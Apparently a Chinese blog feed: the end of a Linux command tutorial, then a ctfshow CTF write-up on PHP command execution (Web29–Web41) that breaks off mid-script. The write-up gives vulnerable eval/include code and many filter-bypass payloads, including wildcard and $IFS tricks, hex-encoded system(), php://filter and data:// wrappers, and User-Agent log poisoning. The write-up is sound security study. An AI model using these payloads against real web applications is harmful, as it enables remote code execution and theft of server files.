class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="应用实例-6"><a href="#应用实例-6" class="headerlink" title="应用实例"></a>应用实例</h4><p>案例1：显示当前时间信息</p><pre class="line-numbers language-date" data-language="date"><code class="language-date">date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>案例2：显示当前时间年月日</p><pre class="line-numbers language-date" data-language="date"><code class="language-date">date &quot;+%Y-%m-%d&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>案例3：显示当前时间年月日时分秒</p><pre class="line-numbers language-date" data-language="date"><code class="language-date">date &quot;+%Y-%m-%d %H-%M-%S&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="设置时间"><a href="#设置时间" class="headerlink" title="设置时间"></a>设置时间</h3><pre class="line-numbers language-date" data-language="date"><code class="language-date">date -s &quot;时间&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h4><p>设置系统当前时间</p><pre class="line-numbers language-date" data-language="date"><code class="language-date">date &quot;2020-11-03 20:02:10&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="cal"><a href="#cal" class="headerlink" title="cal"></a>cal</h3><h4 id="基本语法-15"><a href="#基本语法-15" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-cal" data-language="cal"><code class="language-cal">cal [选项]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="应用实例-7"><a href="#应用实例-7" class="headerlink" title="应用实例"></a>应用实例</h4><p>实例1：显示当前日历</p><pre class="line-numbers language-cal" data-language="cal"><code class="language-cal">cal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>实例2：显示2021年日历</p><pre class="line-numbers language-none"><code class="language-none">cal 2021<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="搜索查找类"><a href="#搜索查找类" class="headerlink" title="搜索查找类"></a>搜索查找类</h2><h3 id="find指令"><a href="#find指令" class="headerlink" title="find指令"></a>find指令</h3><p>find指令从指定目录向下递归地遍历各个子目录，将满足条件的文件或者目录显示在终端</p><h4 id="基本语法-16"><a href="#基本语法-16" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-find" data-language="find"><code class="language-find">find [查找范围] [选项]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="选项说明"><a href="#选项说明" class="headerlink" title="选项说明"></a>选项说明</h4><pre class="line-numbers language-find" data-language="find"><code class="language-find">-name &lt;查找方式&gt;              按照指定的文件名查找模式查找文件-user &lt;用户名&gt;                查找属于指定用户名所有文件-size &lt;文件大小&gt;              按照指定的文件大小查找文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="应用实例-8"><a href="#应用实例-8" class="headerlink" title="应用实例"></a>应用实例</h4><p>案例1：按文件名：根据名称查找/home 目录下的hello.txt文件</p><pre class="line-numbers language-find" data-language="find"><code class="language-find">find &#x2F;home -name hello.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>案例2：按照拥有这：查找/opt 目录下，用户名为nobody的文件</p><pre class="line-numbers language-find" data-language="find"><code class="language-find">find &#x2F;opt -user nobody<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>案例3：查找整个linux系统喜爱大于200M的文件 （+n 大于 -n小于 n等于）(单位 K，M，G)</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -size + 200M<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="locate指令"><a href="#locate指令" class="headerlink" title="locate指令"></a>locate指令</h3><p>locate指令卡伊快速的定位文件路径，速度很快。</p><p>利用实现建立的系统中所有文件名称以及路径的locate数据库，实现快速定位给定的文件。locate无需遍历整个文件系统，所以查询速度快。为了保证准确性，管理必须定期更新locate时刻。</p><h4 id="基本语法-17"><a href="#基本语法-17" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-locate" data-language="locate"><code class="language-locate">locate 搜索文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h4><p>由于locate指令基于数据库查询，所以第一次运行前，必须使用updatedb指令建立locate数据库</p><h4 id="应用实例-9"><a href="#应用实例-9" class="headerlink" title="应用实例"></a>应用实例</h4><p>案例1：请使用locate指令快速定位hello.txt文件所在目录</p><p>locate hello.txt</p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>查找指令在那个目录下。</p><pre class="line-numbers language-which" data-language="which"><code class="language-which">which + 指令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>过滤查找，管道符|，表示将前一个命令的处理结果输出传递给后面的命令处理。</p><h4 id="基本语法-18"><a href="#基本语法-18" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-none"><code class="language-none">grep [选项] 查找内容 源文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="常用选项-2"><a href="#常用选项-2" class="headerlink" title="常用选项"></a>常用选项</h4><p>-n 显示匹配行以及行号</p><p>-i 忽略字母大小写</p><h4 id="应用实例-10"><a href="#应用实例-10" class="headerlink" title="应用实例"></a>应用实例</h4><p>请在hello.txt中，查找’yes’所在的行，并显示行号</p><p>写法1：</p><pre class="line-numbers language-grep" data-language="grep"><code class="language-grep">cat &#x2F;home&#x2F;hello.txt | grep &quot;yes&quot; -n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>写法2：</p><pre class="line-numbers language-grep" data-language="grep"><code class="language-grep">cat -n &quot;yes&quot; &#x2F;home&#x2F;hello.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="通配符查找"><a href="#通配符查找" class="headerlink" title="通配符查找"></a>通配符查找</h3><p>通配符规则：</p><pre class="line-numbers language-none"><code class="language-none">*   代表任意字符(0到多个)？  代表一个字符[ ]  中间为字符组合，仅匹配其中任一一个字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4><p>案例1：查找以v开头的文件</p><pre class="line-numbers language-find" data-language="find"><code class="language-find">find v*.txt &#x2F;home&#x2F;violet<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow命令执行-上</title>
      <link href="/2021/10/04/ctfshow-ming-ling-zhi-xing/"/>
      <url>/2021/10/04/ctfshow-ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>进入页面即可获得源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>从源码中，我们看出这里很明显是命令执行漏洞。因为，因为有eval方法的存在。同时，我们需要注意有一个过滤，会如果匹配到flag，则无法执行eval方法。所以，我们的问题是，如何既能触发eval，又能读取文件呢？</p><h3 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h3><p>这里，主要有两种思路。</p><h4 id="思路一：使用’’绕过"><a href="#思路一：使用’’绕过" class="headerlink" title="思路一：使用’’绕过"></a>思路一：使用’’绕过</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`ln f''l''ag.php`</span>通配符payload1<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl fla?????"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>payload2<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl fla*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>payload3<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl fl''ag.php`</span><span class="token punctuation">;</span>或者c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl fl“”ag.php`</span><span class="token punctuation">;</span>payload4<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl fl\ag.php`</span><span class="token punctuation">;</span><span class="token comment">//转义字符绕过</span>payload5<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span>payload6<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nl flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>payload7<span class="token punctuation">:</span>c<span class="token operator">=</span>awk <span class="token string single-quoted-string">'&#123;printf $0&#125;'</span> flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span>还有很多姿势，毕竟等于没过滤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们来分析一下，我们知道eval是将字符串当作php代码执行。而echo 与反单引号结合，则会将反引号中的内容当作命令执行。而我们的环境为Linux。所以，我们在此使用linux的命令。首先，ln是将文件的内容显示并输出行数。然后，这里完全可以用cat、less、more代替。</p><p>在linux中’’被忽略，至于通配符，我再linux初步学习中已经说过了。</p><h4 id="思路2：多变量绕过"><a href="#思路2：多变量绕过" class="headerlink" title="思路2：多变量绕过"></a>思路2：多变量绕过</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;?c&#x3D;eval($_GET[&#39;a&#39;]);&amp;a&#x3D;nl flag.php;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h2><p>与上一题基本相同</p><pre class="line-numbers language-none"><code class="language-none">system()passthru()exec()shell_exec()popen()proc_open()pcntl_exec()反引号 同shell_exec() <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>可以看到cat被过滤，cat的代替</p><pre class="line-numbers language-none"><code class="language-none">more，一页页的查看less，类似与more，但是它不会一下子将文件全部读取，而是需要多少读多少tac，反向读取vi，vim 都是linux自带的编辑器nl, 输出文件内容，并输出行号head，从头部输出信息tail，从尾部输出内容grep [选项] 查找内容 源文件od:以二进制的方式读取档案内容（新学到的）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>空格被过滤：</p><pre class="line-numbers language-none"><code class="language-none">&#123;$IFS&#125;   $IFS$9&gt; &lt; &lt;&gt; 重定向符%09(需要php环境)&#123;cat,flag.php&#125; &#x2F;&#x2F;用逗号实现了空格功能%20  https:&#x2F;&#x2F;blog.csdn.net&#x2F;whuslei&#x2F;article&#x2F;details&#x2F;7187639 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(&#39;nl flag.php&#39;);c&#x3D;highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));c&#x3D;echo(&#96;nl%09fl[abc]*&#96;);c&#x3D;&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;nl%09fl[a]*&quot;);等价于system()c&#x3D;echo&#96;strings%09f*&#96;;c&#x3D;echo&#96;strings\$IFS\$9f*&#96;必须加转义字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面便是大佬的payload。</p><p>我们一一分析一下，第一个没什么好说的。</p><h3 id="c-highlight-file-next-array-reverse-scandir-dirname-FILE"><a href="#c-highlight-file-next-array-reverse-scandir-dirname-FILE" class="headerlink" title="c=highlight_file(next(array_reverse(scandir(dirname(FILE)))));"></a>c=highlight_file(next(array_reverse(scandir(dirname(<strong>FILE</strong>)))));</h3><h4 id="dirname-FILE"><a href="#dirname-FILE" class="headerlink" title="dirname(FILE)"></a>dirname(<strong>FILE</strong>)</h4><p>参考链接<a href="https://www.awaimai.com/408.html">https://www.awaimai.com/408.html</a></p><p>dirname(<strong>FILE</strong>)获得当前文件的绝对路径。__FILE__是当前脚本的绝对路径，通过 dirname() 函数后，就可以获得脚本所在目录的绝对路径。</p><blockquote><p>举个栗子，有个 hello.php 文件，其部署在服务器的目录是：/home/www/website/hello.php</p></blockquote><blockquote><p>那么， <strong>FILE</strong> 的值就是：/home/www/website/hello.php<br>dirname(<strong>FILE</strong>) 返回就是：/home/www/website/</p></blockquote><p>如果我们在 hello.php 用 __DIR__全局变量，就可以直接获得所在目录的绝对路径：/home/www/website/，和 dirname(<strong>FILE</strong>) 效果完全一样。</p><p>在实现同样功能的情况下，dirname(<strong>FILE</strong>)多了一层函数调用。所以， <strong>DIR</strong> 比 dirname(<strong>FILE</strong>) 在效率上有优势。</p><p>但是，<br><strong>FILE</strong> 和 dirname() 函数从 PHP 4.0.2 就开始启用。</p><p><strong>DIR</strong> 变量则是 PHP5.3.0 新增的。</p><p>所以，如果你的PHP版本大于等于PHP5.3.0，建议使用 __DIR__。否则，最好还是用 dirname(<strong>FILE</strong>)，以确保程序不会出错。</p><h4 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h4><blockquote><p>scandir(string $directory, int $sorting_order = ?, resource $context = ?): array</p></blockquote><blockquote><p>返回一个 array，包含有 directory 中的文件和目录。</p></blockquote><p>参数<br>directory<br>要被浏览的目录</p><p>sorting_order<br>默认的排序顺序是按字母升序排列。如果使用了可选参数 sorting_order（设为 1），则排序顺序是按字母降序排列。</p><p>context<br>context</p><h4 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse"></a>array_reverse</h4><p>array_reverse() 接受数组 array 作为输入并返回一个单元为相反顺序的新数组。</p><h4 id="next"><a href="#next" class="headerlink" title="next"></a>next</h4><p>返回数组内部指针指向的下一个单元的值，或当没有更多单元时返回 false。</p><h4 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file"></a>highlight_file</h4><p>使用PHP内置的语法高亮器所定义的颜色，打印输出或者返回 filename 文件中语法高亮版本的代码。</p><h4 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h4><p>首先，获得文件所在的目录。然后，将其数组化，之后逆序。然后，进入下一个文件名，再使用一个highlight_file获得文件内容。</p><p>至于，大佬为什么要逆置，可能是因为scanndir返回的数组中第0个和第1个为 ./..。</p><h3 id="c-show-source-next-array-reverse-scandir-pos-localeconv"><a href="#c-show-source-next-array-reverse-scandir-pos-localeconv" class="headerlink" title="c=show_source(next(array_reverse(scandir(pos(localeconv())))));"></a>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</h3><p>参考链接：<a href="https://www.cxyzjd.com/article/qq_38154820/107171940">https://www.cxyzjd.com/article/qq_38154820/107171940</a><br>这篇文章，记录了很多无参读取文件的方法，值得读一下。</p><h4 id="pos-localeconv"><a href="#pos-localeconv" class="headerlink" title="pos(localeconv())"></a>pos(localeconv())</h4><p>localeconv<br>localeconv()返回一包含本地数字及货币格式信息的数组。而数组第一项就是”.”（后续出现的.都用双引号包裹，方便识别）</p><p><img src="1.png"></p><p>要怎么取到这个点呢，另一个函数：</p><p>current()返回数组中的单元，默认取第一个值：</p><p>还可以使用pos是current的别名</p><p>如果都被过滤还可以使用reset()，该函数返回数组第一个单元的值，如果数组为空则返回 FALSE</p><h4 id="综合-1"><a href="#综合-1" class="headerlink" title="综合"></a>综合</h4><p>剩下的与第二条语句类似，这里不赘述了。</p><p>其基本思想都基本相同，主要就是如何获得目前目录的地址。我们这里有两个方式，一个是通过绝对路径。即，dirname(<strong>FILE</strong>)。二是，通过相对路径，即“.”。问题就是我们在做题时一般来说，“.”都会被过滤。所以，我们就通过localeconv()的方式来取得”.”。</p><h3 id="c-”-x73-x79-x73-x74-x65-x6d”-“nl-09fl-a-”-等价于system"><a href="#c-”-x73-x79-x73-x74-x65-x6d”-“nl-09fl-a-”-等价于system" class="headerlink" title="c=”\x73\x79\x73\x74\x65\x6d”(“nl%09fl[a]*”);等价于system()"></a>c=”\x73\x79\x73\x74\x65\x6d”(“nl%09fl[a]*”);等价于system()</h3><p>这里使用了\x 在php中会将这个16进制数解码</p><h3 id="c-echostrings-IFS-9f-必须加转义字符"><a href="#c-echostrings-IFS-9f-必须加转义字符" class="headerlink" title="c=echostrings\$IFS\$9f*必须加转义字符"></a>c=echo<code>strings\$IFS\$9f*</code>必须加转义字符</h3><p>这里的strings其实可以简单理解为读取一段字符串，一般以换行符，或者空字符为结束。</p><h4 id="IFS-9"><a href="#IFS-9" class="headerlink" title="$IFS$9"></a>$IFS$9</h4><p>$IFS 默认为空字符，空格tab换行符，这里我的理解为将其设为空格。</p><h2 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>反引号、括号，echo。</p><p>知识点：include可以不需要括号所以 分号可以用?&gt;代替</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.phpc&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一部分牵扯到文件包含漏洞。于是，直接跑过去写一篇文件包含漏洞的文章。</p><h2 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h2><h3 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤"></a>过滤</h3><p>多过滤了一个双引号，</p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h2><p>过滤多了一个冒号，也是上一关payload 。</p><h2 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h2><p>多过滤了&lt;、=。没啥用，直接还是原来的。</p><h2 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h2><p>多过滤了数字。</p><pre class="line-numbers language-none"><code class="language-none">c&#x3D;include$_GET[a]?%3E&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>伪协议用起来。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;nl fla*&quot;);?&gt;c&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log日志包含配合UA头解决战斗发送UA&lt;?php system(&#39;cat flag.php&#39;); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h2><p>增加了php/file的过滤</p><p>payload与上一个相同。</p><h2 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里过滤了，数字和几乎所有字符，但是()和字母没有被过滤。我们可以使用web31的方法。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h2><p>这里几乎过滤所有的参数，所以我们需要使用无字母无数字payload。这里，相关的知识点，我已经写了。</p><p>这里直接给脚本吧。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://a228128e-be2b-45ec-8926-4e36a576fcec.challenge.ctf.show:8080"</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>ans1<span class="token operator">=</span><span class="token string">""</span>ans2<span class="token operator">=</span><span 